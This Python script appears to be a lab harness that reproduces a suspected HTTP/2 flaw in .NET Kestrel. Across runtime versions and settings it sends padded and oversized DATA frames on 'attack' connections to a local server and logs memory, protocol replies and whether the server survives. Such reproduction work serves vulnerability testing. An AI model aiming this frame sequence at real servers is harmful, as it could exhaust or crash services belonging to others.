import json
import os
import subprocess
import time
from probe2 import connect, frame, headers, collect, health, sample, describe

ROOT = os.path.abspath("f043-lab")
CONFIG14 = os.path.join(ROOT, "runtimeconfig-10.0.14.json")

def run(label, config, mode):
    tfm = "net11.0" if label == "11.0.0" else "net10.0"
    assembly = os.path.join(ROOT, "bin", "Debug", tfm, "f043-lab.dll")
    command = (["dotnet", "exec", "--runtimeconfig", CONFIG14, assembly]
               if label == "10.0.14" else ["dotnet", assembly])
    env = os.environ.copy()
    env["F043_TIGHT"] = "1" if config == "tight" else "0"
    process = subprocess.Popen(command, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    out = {"requested": label, "config": config, "mode": mode, "command": command}
    attack = None
    try:
        for _ in range(50):
            if process.poll() is not None:
                raise RuntimeError("server exited at startup")
            try:
                h = health()
                if h:
                    break
            except Exception:
                time.sleep(0.1)
        else:
            raise RuntimeError("server failed to become healthy")
        out["runtime"] = h["runtime"]
        out["kestrelAssembly"] = h["kestrelAssembly"]
        out["onDataCalls"] = h["onDataCalls"]
        out["before"] = sample(3)
        attack = connect()
        for sid in (1, 3):
            attack.sendall(frame(1, 4, sid, headers("/hold", "POST")))
        pad_wire = 0
        if mode == "prepad":
            if config == "tight":
                payload = frame(0, 8, 1, b"\xff" + b"\x00" * 255)
                attack.sendall(payload)
                pad_wire = len(payload)
            else:
                for sid in (1, 3):
                    payload = frame(0, 8, sid, b"\xff" + b"\x00" * 255)
                    attack.sendall(payload * 256)
                    pad_wire += len(payload) * 256
        out["beforeData"] = describe(collect(attack, 0.15))
        if config == "tight":
            lengths = (32767, 32768) if mode == "valid" else (32768, 32768)
        else:
            lengths = (400 * 1024, 400 * 1024) if mode == "valid" else (560 * 1024, 560 * 1024)
        sent = 0
        send_error = None
        for sid, length in zip((1, 3), lengths):
            left = length
            while left:
                n = min(left, 16384)
                try:
                    attack.sendall(frame(0, 0, sid, b"x" * n))
                except OSError as e:
                    send_error = str(e)
                    break
                sent += n + 9
                left -= n
            if send_error:
                break
        assert sent + pad_wire < 1_500_000
        out["sent"] = {"paddingWire": pad_wire, "bodyWire": sent,
                       "plannedBodyData": sum(lengths), "sendError": send_error}
        out["protocol"] = describe(collect(attack, 0.6))
        out["during"] = sample(3)
        attack.close()
        attack = None
        time.sleep(0.1)
        out["after"] = sample(3)
        out["alive"] = process.poll() is None
    except Exception as e:
        out["error"] = type(e).__name__ + ": " + str(e)
    finally:
        if attack:
            attack.close()
        process.terminate()
        try:
            _, err = process.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            process.kill()
            _, err = process.communicate(timeout=3)
        out["serverLogTail"] = err.decode(errors="replace")[-700:]
    return out

for label in ("10.0.14", "10.0.15", "11.0.0"):
    for config in ("tight", "default"):
        for mode in ("valid", "no_pad", "prepad"):
            print(json.dumps(run(label, config, mode)), flush=True)
print(json.dumps(run("10.0.14", "tight", "prepad")), flush=True)
print(json.dumps(run("10.0.14", "default", "prepad")), flush=True)
print("F043_HISTORICAL_CURRENT_MATRIX_COMPLETE", flush=True)
